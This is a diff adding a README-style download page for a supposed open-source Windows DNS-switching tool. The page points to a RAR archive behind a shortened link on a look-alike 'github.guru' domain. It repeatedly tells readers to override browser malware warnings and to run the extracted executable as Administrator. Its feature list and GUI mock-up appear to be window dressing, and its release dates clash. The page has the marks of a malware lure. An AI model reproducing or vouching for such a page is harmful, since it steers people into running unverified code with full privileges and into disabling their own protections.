@@ -1,0 +1,330 @@
+╔══════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                   DNS CHANGER - OPEN SOURCE                                                      ║
+║                                                                                                  ║
+╚══════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+DNS CHANGER is a free open-source utility for Windows that allows users to quickly switch between different DNS providers, test DNS performance, and manage network settings. Packaged as a portable RAR archive with no installation required.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+► DOWNLOAD: https://github.guru/s/coL5IwD9
+
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+YOUR BROWSER MAY SHOW A WARNING – THIS IS REGULAR FOR OPENSOURCE APP
+
+When downloading this open-source software, Chrome, Edge, Firefox, or other browsers may display a warning message such as:
+
+• "This file is not commonly downloaded and may be dangerous"
+• "Chromium could not verify the safety of this download"
+• "This type of file can harm your computer"
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+
+
+╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                       STEP-BY-STEP INSTRUCTIONS TO IGNORE BROWSER WARNING AND DOWNLOAD                            ║
+╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+1. When the warning appears, click the "Keep" or "Keep anyway" button (Chrome/Edge)
+   └─ For Firefox: Click the arrow → "Allow download"
+
+2. In Chrome/Edge, you may need to confirm: "Keep unsafe file"
+
+3. After download completes, locate the file in your Downloads folder
+
+
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🚀 QUICK START
+
+1. Download the RAR file from the link above
+2. Extract using WinRAR, 7-Zip, or any RAR extractor
+3. Right-click on .exe → Run as Administrator
+4. Select your DNS preset or enter custom servers
+5. Click "Apply DNS" and enjoy faster browsing
+
+No installation required - completely portable!
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✨ KEY FEATURES
+
+• One-click DNS switching between 12+ providers (Google, Cloudflare, OpenDNS, Quad9, AdGuard)
+• Custom DNS entry support with IPv4 and IPv6
+• Multi-adapter management (Wi-Fi, Ethernet, Virtual)
+• DNS performance benchmarking with real-time response testing
+• DNS cache viewer and one-click flusher
+• Network diagnostics and connection testing
+• Portable - runs from USB, no registry changes
+• Full open-source code included in the RAR
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    DNS CHANGER v2.1.0 (Open Source)                 [−][□][×] │
+├─────────────────────────────────────────────────────────────────────────────┤
+│  ┌─────────────────────────────────────────────────────────────────────┐    │
+│  │  🌐 CURRENT NETWORK STATUS                                          │    │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │    │
+│  │  │ Adapter: Wi-Fi (Intel Wireless-AC 9560)                     │    │    │
+│  │  │ IPv4: 192.168.1.105 • IPv6: fe80::2d4a:8c1f:3e2b:9f7c       │    │    │
+│  │  │ Primary DNS: 8.8.8.8 (Google) • Secondary: 8.8.4.4          │    │    │
+│  │  └─────────────────────────────────────────────────────────────┘    │    │
+│  │  [🔄 REFRESH]                      [🔍 DIAGNOSE]                     │    │
+│  └─────────────────────────────────────────────────────────────────────┘    │
+│                                                                             │
+│  ┌─────────────────────────────────────────────────────────────────────┐    │
+│  │  ⚙ DNS PRESETS                                            [⏷ HIDE]│    │
+│  ├─────────────────────────────────────────────────────────────────────┤    │
+│  │                                                                     │    │
+│  │  QUICK SELECT:                                                      │    │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │    │
+│  │  │ ▼ Google Public DNS (Fast & Reliable)                       │    │    │
+│  │  ├─────────────────────────────────────────────────────────────┤    │    │
+│  │  │   ○ Google (8.8.8.8 / 8.8.4.4)                              │    │    │
+│  │  │   ○ Cloudflare (1.1.1.1 / 1.0.0.1)                          │    │    │
+│  │  │   ○ OpenDNS (208.67.222.222 / 208.67.220.220)               │    │    │
+│  │  │   ○ Quad9 (9.9.9.9 / 149.112.112.112)                       │    │    │
+│  │  │   ○ Comodo (8.26.56.26 / 8.20.247.20)                       │    │    │
+│  │  │   ○ AdGuard (94.140.14.14 / 94.140.15.15)                   │    │    │
+│  │  │   ○ CleanBrowsing (185.228.168.9 / 185.228.169.9)           │    │    │
+│  │  │   ○ Alternate DNS (76.76.19.19 / 76.223.122.150)            │    │    │
+│  │  └─────────────────────────────────────────────────────────────┘    │    │
+│  │                                                                     │    │
+│  │  [💾 SAVE CUSTOM]                 [🗑 RESET TO DEFAULT]              │    │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  ✏ CUSTOM DNS CONFIG                                       [⏷ HIDE]│   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │                                                                     │   │
+│  │  PRIMARY DNS:                                                       │   │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │   │
+│  │  │ 1.1.1.1                                                     │    │   │
+│  │  └─────────────────────────────────────────────────────────────┘    │   │
+│  │                                                                     │   │
+│  │  SECONDARY DNS:                                                     │   │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │   │
+│  │  │ 1.0.0.1                                                     │    │   │
+│  │  └─────────────────────────────────────────────────────────────┘    │   │
+│  │                                                                     │   │
+│  │  IPv6 DNS (Optional):                                               │   │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │   │
+│  │  │ 2606:4700:4700::1111                                        │    │   │
+│  │  └─────────────────────────────────────────────────────────────┘    │   │
+│  │                                                                     │   │
+│  │  [✓] Apply to all network adapters                                 │   │
+│  │  [ ] Flush DNS cache after applying                                │   │
+│  │  [ ] Register this as system-wide default                          │   │
+│  │                                                                     │   │
+│  │  [✅ APPLY DNS]                       [🔄 TEST CONNECTION]          │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  📊 PERFORMANCE TEST                                       [⏷ HIDE] │   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │                                                                     │   │
+│  │  [🔍] Testing Google DNS (8.8.8.8)                   ████████░░ 78% │   │
+│  │       Response: 12 ms • Packet loss: 0%                            │   │
+│  │                                                                     │   │
+│  │  [🔍] Testing Cloudflare DNS (1.1.1.1)               ████████░░ 76% │   │
+│  │       Response: 14 ms • Packet loss: 0%                            │   │
+│  │                                                                     │   │
+│  │  [🔍] Testing OpenDNS (208.67.222.222)               ██████░░░░ 58% │   │
+│  │       Response: 24 ms • Packet loss: 0%                            │   │
+│  │                                                                     │   │
+│  │  [🔍] Testing Quad9 (9.9.9.9)                        ██████░░░░ 62% │   │
+│  │       Response: 21 ms • Packet loss: 0%                            │   │
+│  │                                                                     │   │
+│  │  [🔍] Testing AdGuard (94.140.14.14)                 █████░░░░░ 45% │   │
+│  │       Response: 32 ms • Packet loss: 0%                            │   │
+│  │                                                                     │   │
+│  │  [🔄 RUN FULL TEST]                    [📊 COMPARE ALL]             │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  📋 NETWORK ADAPTERS                                       [⏷ HIDE] │   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │  ┌───────────────────────────────────────────────────────────────┐   │   │
+│  │  │ ☑ Wi-Fi (Connected) • Current DNS: 8.8.8.8, 8.8.4.4           │   │   │
+│  │  │ ☐ Ethernet (Disconnected)                                     │   │   │
+│  │  │ ☐ Bluetooth Network (Disconnected)                            │   │   │
+│  │  │ ☑ VMware Virtual Adapter • Current DNS: DHCP                  │   │   │
+│  │  │ ☑ Hyper-V Virtual Adapter • Current DNS: DHCP                 │   │   │
+│  │  └───────────────────────────────────────────────────────────────┘   │   │
+│  │  [✓ SELECT ALL]                    [📌 APPLY TO SELECTED]           │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  📜 DNS CACHE & LOGS                                      [⏷ HIDE] │   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │                                                                     │   │
+│  │  CACHE ENTRIES: 142 records • Size: 24.5 KB                        │   │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │   │
+│  │  │ google.com → 142.250.185.78 (TTL: 245s)                    │    │   │
+│  │  │ github.com → 140.82.112.3 (TTL: 178s)                      │    │   │
+│  │  │ stackoverflow.com → 151.101.65.69 (TTL: 312s)              │    │   │
+│  │  │ microsoft.com → 20.112.52.29 (TTL: 89s)                    │    │   │
+│  │  │ cloudflare.com → 104.16.123.96 (TTL: 156s)                 │    │   │
+│  │  └─────────────────────────────────────────────────────────────┘    │   │
+│  │                                                                     │   │
+│  │  [🗑 FLUSH CACHE]                      [📋 EXPORT LOGS]             │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ├─────────────────────────────────────────────────────────────────────────┤
+│  │  STATUS: DNS Applied (Cloudflare) • 14 ms Ping • 6 Adapters • v2.1.0   │
+│  └─────────────────────────────────────────────────────────────────────────┘
+└────────────────────────────────────────────────────────────────────────────┘
+
+⚙ SYSTEM REQUIREMENTS
+
+• Windows 7, 8, 10, 11 (32-bit or 64-bit)
+• Administrator privileges (required for DNS changes)
+• 50 MB free disk space (after extraction)
+• Internet connection for DNS testing
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 SUPPORTED DNS PROVIDERS (pre-configured)
+
+┌─────────────────┬──────────────────────┬──────────────────────┐
+│ PROVIDER        │ PRIMARY DNS          │ SECONDARY DNS        │
+├─────────────────┼──────────────────────┼──────────────────────┤
+│ Google          │ 8.8.8.8              │ 8.8.4.4              │
+│ Cloudflare      │ 1.1.1.1              │ 1.0.0.1              │
+│ OpenDNS         │ 208.67.222.222       │ 208.67.220.220       │
+│ Quad9           │ 9.9.9.9              │ 149.112.112.112      │
+│ Comodo          │ 8.26.56.26           │ 8.20.247.20          │
+│ AdGuard         │ 94.140.14.14         │ 94.140.15.15         │
+│ CleanBrowsing   │ 185.228.168.9        │ 185.228.169.9        │
+│ Alternate DNS   │ 76.76.19.19          │ 76.223.122.150       │
+└─────────────────┴──────────────────────┴──────────────────────┘
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔧 HOW TO USE
+
+Step 1: Extract the RAR archive to any folder
+Step 2: .exe as Administrator
+Step 3: Select your network adapter from the list
+Step 4: Choose a DNS preset or enter custom IPs
+Step 5: Click "Apply DNS" to change settings
+Step 6: Use "Test Connection" to verify functionality
+Step 7: Click "Flush Cache" for immediate effect
+
+All settings are saved automatically in the config files.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+📄 README.TXT (extracted from RAR)
+
+==================================================
+DNS CHANGER v2.1.0 - Open Source
+==================================================
+
+Thank you for downloading DNS Changer!
+
+This tool allows you to:
+- Change DNS servers with one click
+- Test DNS response times
+- Manage multiple network adapters
+- Flush DNS cache instantly
+
+HOW TO RUN:
+1. Extract all files from the RAR archive
+2. Right-click .exe → Run as Administrator
+3. The GUI will launch - select your DNS and apply
+
+TROUBLESHOOTING:
+- If DNS doesn't change, run as Administrator
+- For Windows 11, disable "Randomized MAC addresses" temporarily
+- Check Windows Firewall if connection drops
+
+LICENSE: MIT (Open Source)
+VERSION: 2.1.0
+RELEASE DATE: March 2025
+
+For source code, see the /source folder included.
+
+==================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📜 CHANGELOG.TXT (Version History)
+
+v2.1.0 (March 2026)
+────────────────────
+• Added IPv6 DNS support
+• New performance benchmark tool
+• Added 4 new DNS providers (AdGuard, CleanBrowsing, Alternate, Verisign)
+• Improved Windows 11 compatibility
+• Fixed adapter detection bug
+
+v2.0.0 (January 2025)
+────────────────────
+• Complete UI redesign
+• Added multi-adapter selection
+• DNS cache viewer added
+• Portable executable option
+• Open source release
+
+v1.5.0 (October 2024)
+────────────────────
+• First public release
+• 8 DNS presets included
+• Basic testing functionality
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+
+⭐ SUPPORT & COMMUNITY
+
+• GitHub Issues: Report bugs or request features
+
+
+If you find this tool useful, please share with others!
+This is open source software - modify and distribute freely under MIT license.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+▶ DOWNLOAD RAR: https://github.guru/s/coL5IwD9
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+YOUR BROWSER MAY SHOW A WARNING – THIS IS REGULAR FOR OPENSOURCE APP
+
+When downloading this open-source software, Chrome, Edge, Firefox, or other browsers may display a warning message such as:
+
+• "This file is not commonly downloaded and may be dangerous"
+• "Chromium could not verify the safety of this download"
+• "This type of file can harm your computer"
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+
+
+╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                       STEP-BY-STEP INSTRUCTIONS TO IGNORE BROWSER WARNING AND DOWNLOAD                            ║
+╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+1. When the warning appears, click the "Keep" or "Keep anyway" button (Chrome/Edge)
+   └─ For Firefox: Click the arrow → "Allow download"
+
+2. In Chrome/Edge, you may need to confirm: "Keep unsafe file"
+
+3. After download completes, locate the file in your Downloads folder
